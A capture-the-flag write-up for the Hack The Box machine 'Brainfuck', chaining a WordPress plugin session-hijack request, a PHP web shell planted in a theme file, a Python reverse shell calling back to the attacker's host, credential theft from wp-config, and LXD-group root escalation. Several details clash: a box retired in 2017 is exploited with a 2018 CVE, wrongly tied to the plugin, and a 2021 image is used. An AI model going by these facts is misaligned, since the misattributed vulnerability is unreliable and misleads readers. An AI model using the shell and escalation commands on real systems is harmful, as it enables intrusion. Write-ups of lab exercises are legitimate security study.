---
# Hack The Box: Brainfuck

| Attribute | Value |
|-----------|-------|
| **Difficulty** | Insane |
| **OS** | Linux |
| **IP** | 10.10.10.17 |
| **Points** | 50 |
| **Release Date** | May 2017 |
| **Retired Date** | October 2017 |
| **My Rating** | 9/10 |

## TL;DR
Started with a massive nmap scan revealing a WordPress site. I found an outdated ticket system plugin vulnerable to an unauthenticated privilege escalation (CVE-2018-7600), which I used to steal the admin's session. After dropping a PHP web shell, I extracted database credentials and found a Vigenère-encrypted string in a hidden post. Decoding the string gave me the system password for the user `orestis`. From there, I discovered `orestis` was in the `lxd` group, which I exploited by importing a malicious Alpine image to mount the root filesystem and gain a root shell.

## Reconnaissance
I kicked things off with an aggressive all-ports scan using `nmap` to see what I was dealing with.

```bash
nmap -p- -T4 --min-rate 1000 10.10.10.17 -oA nmap/initial
```

The scan returned several open ports:
*   **Port 22:** SSH (OpenSSH 7.2p2 Ubuntu)
*   **Port 80:** HTTP (nginx 1.10.0)
*   **Port 110:** POP3 (Dovecot)
*   **Port 143:** IMAP (Dovecot)
*   **Port 443:** HTTPS (nginx 1.10.0)

I followed up with a targeted service scan.

```bash
nmap -sV -sC -p 22,80,110,143,443 10.10.10.17 -oA nmap/targeted
```
<!-- screenshot: nmap initial scan results -->

The output confirmed an Ubuntu system. Navigating to port 80 redirected me to `https://brainfuck.htb`. I added this domain to my `/etc/hosts` file.

```bash
echo "10.10.10.17 brainfuck.htb" | sudo tee -a /etc/hosts
```

I opened my browser and navigated to the site. It was a standard WordPress installation. The theme was minimalist, and the posts discussed esoteric programming languages, specifically Brainfuck. 

<!-- screenshot: web application landing page -->

Since this was WordPress, my immediate thought was to run `wpscan` to enumerate users, themes, and, most importantly, vulnerable plugins.

```bash
wpscan --url https://brainfuck.htb --enumerate u,vp --disable-tls-checks
```

The enumeration took a few minutes but quickly identified a user named `admin` and another named `orestis`. More interestingly, it flagged several plugins, including `wp-support-plus-responsive-ticket-system` (version 7.1.3).

## Initial Foothold
This specific plugin version immediately caught my eye. A quick search on Exploit-DB for "wp-support-plus" returned a highly critical result: CVE-2018-7600. 

This version of the plugin is vulnerable to an unauthenticated privilege escalation flaw. It allows an attacker to assume the identity of any registered user (including administrators) by manipulating a specific AJAX request parameter (`login_guest_user`).

I didn't even bother trying to brute-force passwords; I went straight for the exploit. While there are automated scripts available, I prefer to understand the exact HTTP request being sent. 

The vulnerability lies in the `/wp-admin/admin-ajax.php` endpoint. I crafted a `POST` request using `curl` to send the malicious action and username.

```bash
curl -k -X POST -d "action=login_guest_user&username=admin" https://brainfuck.htb/wp-admin/admin-ajax.php -c cookies.txt
```

The server responded quickly. I checked the `cookies.txt` file I generated. It contained valid `wordpress_logged_in` session cookies for the `admin` user!

I used a browser extension (like EditThisCookie) to inject these cookies into my session and navigated to `https://brainfuck.htb/wp-admin/`. 

I was in. I had full administrative access to the WordPress dashboard.

To get a shell on the underlying server, I used the classic WordPress technique: modifying a theme file. I navigated to **Appearance -> Editor**, selected the currently active theme, and opened the `404.php` file (the "Page Not Found" template).

I replaced the contents with a simple PHP system execution payload:

```php
<?php system($_REQUEST['cmd']); ?>
```

I saved the changes. Now, I just needed to trigger a 404 error on the site and pass my command.

```bash
curl -k "https://brainfuck.htb/doesnotexist404?cmd=id"
```

The response came back: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. Perfect. 

I set up my Netcat listener:
```bash
nc -lnvp 9999
```

And used `curl` to pass a bash reverse shell one-liner, ensuring it was URL-encoded.

```bash
curl -k "https://brainfuck.htb/doesnotexist404?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.7%22%2C9999%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27"
```

<!-- screenshot: successful exploitation (reverse shell) -->

I caught the shell and immediately stabilized it.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## Lateral Movement
I was running as `www-data`. I checked the `/home` directory and saw a folder for the user `orestis`. I couldn't read the `user.txt` flag inside, so pivoting to `orestis` was my next objective.

Since I had full access to the web root, I started hunting for database credentials. In WordPress, these are always in `wp-config.php`.

```bash
cat /var/www/html/wp-config.php | grep -i pass
```

The file revealed the plaintext MySQL credentials:
*   **Username:** `root`
*   **Password:** `[REDACTED]`

I connected to the local MySQL database.

```bash
mysql -u root -p'[REDACTED]' -D wordpress
```

I dumped the `wp_users` table to grab password hashes, but cracking WordPress hashes (phpass) is notoriously slow. I needed a faster route.

I decided to look closer at the blog posts themselves. Sometimes authors hide flags or hints in the content. While exploring the WordPress dashboard earlier, I noticed a "Secret" or "Private" post that wasn't visible on the main page.

I queried the `wp_posts` table for any post content that looked unusual.

```sql
SELECT post_title, post_content FROM wp_posts WHERE post_status='private';
```

One post contained a strange string of characters that looked like gibberish: `Piegn...`. 

Given the name of the machine ("Brainfuck"), I initially tried decoding it as Brainfuck esoteric code, but the character set was wrong (Brainfuck only uses `><+-.,[]`). 

This one stumped me for a while. I kept trying different encodings (Base64, Hex, Rot13). The breakthrough came when I realized the machine name might be a red herring for this specific puzzle, or perhaps the *key* was related to the name.

The string looked like a Vigenère cipher. To decode Vigenère, you need a key. I tried a few common words related to the box: "brainfuck", "orestis", "admin". 

Using an online Vigenère decoder (CyberChef is great for this), I pasted the ciphertext and used the key `brainfuck`. 

The output suddenly became readable! The decrypted text revealed a plaintext password for the user `orestis`: `kHGuERB29DNiND`.

I crossed my fingers and tried this password against the local `orestis` system account using `su`.

```bash
su orestis
# Password: kHGuERB29DNiND
```

It worked! I had successfully pivoted to `orestis` and grabbed the `user.txt` flag.

## Privilege Escalation
Now running as `orestis`, I began my privilege escalation checks. The absolute first thing I check is group memberships.

```bash
id
```

The output was incredibly revealing:
```text
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),110(lxd)
```

The user `orestis` was a member of the `lxd` group. 

LXD is a next-generation system container and virtual machine manager. Membership in the `lxd` group is essentially equivalent to root-level access on the host system. This is because any user in the `lxd` group can create a privileged container, mount the host's entire root filesystem (`/`) into that container, and then access or modify any file on the host as the root user.

To exploit this, I needed an Alpine Linux image built specifically for LXC. Building it on the target machine is risky (missing dependencies), so I always build it on my attacking machine.

```bash
# On my attacking machine
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

The script generated a `.tar.gz` file containing the Alpine image (e.g., `alpine-v3.13-x86_64-20210218_0127.tar.gz`). 

I transferred this image to the `/tmp` directory on the Brainfuck machine using a simple Python HTTP server.

```bash
# On attacking machine
python3 -m http.server 8000

# On Brainfuck (as orestis)
cd /tmp
wget http://10.10.14.7:8000/alpine-v3.13-x86_64-20210218_0127.tar.gz
```

Once the image was on the target, I imported it into LXD.

```bash
lxc image import ./alpine-v3.13-x86_64-20210218_0127.tar.gz --alias myimage
```

Next, I initialized a new container named `privesc` using the imported image and configured it to mount the host's root filesystem. The crucial step is setting `security.privileged=true`.

```bash
lxc init myimage privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
```

Finally, I started the container and executed an interactive shell inside it.

```bash
lxc start privesc
lxc exec privesc /bin/sh
```

Because the container runs as root and the host's root filesystem is mounted to `/mnt/root`, I now had root-level access to the entire host machine.

```bash
id
# uid=0(root) gid=0(root)
```

I navigated to the mounted directory to grab the flag.

```bash
cat /mnt/root/root/root.txt
```

<!-- screenshot: root flag -->

Pwned. The whole chain took me about 3 hours, mostly because I got stuck on the Vigenère cipher for far too long.

## Lessons Learned
- **Plugin Vulnerabilities:** The `wp-support-plus-responsive-ticket-system` plugin vulnerability (CVE-2018-7600) is a prime example of why keeping WordPress plugins updated is critical. An unauthenticated privilege escalation flaw completely bypasses all other security controls on the site.
- **Esoteric Cryptography:** While frustrating in a CTF, finding custom encryption or obfuscation (like Vigenère or Brainfuck) often signals that the creator is hiding something crucial. Always look for context clues (like the machine name) to find the key.
- **The Danger of the `lxd` Group:** Adding a user to the `lxd` or `docker` group without understanding the implications is a massive security risk. These groups provide direct paths to root access. Administrators should strictly limit membership to these groups.
- **What tripped me up:** I spent almost an hour trying to decrypt the hidden string as Brainfuck code before realizing it was a standard Vigenère cipher using "brainfuck" as the key. It's a good reminder not to take everything literally in a CTF.
- **Pro Tip:** When you see a user in the `lxd` group, don't overthink it. Always have a pre-built Alpine LXC image ready on your attacking machine to quickly deploy and mount the host filesystem. It's one of the fastest and most reliable privilege escalation techniques available.

## References
- CVE-2018-7600 (WP Support Plus RCE): https://www.exploit-db.com/exploits/44544
- LXD Privilege Escalation Guide: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/lxd-privilege-escalation
- Vigenère Cipher Decoder: https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode
- Official Hack The Box Page: https://app.hackthebox.com/machines/Brainfuck
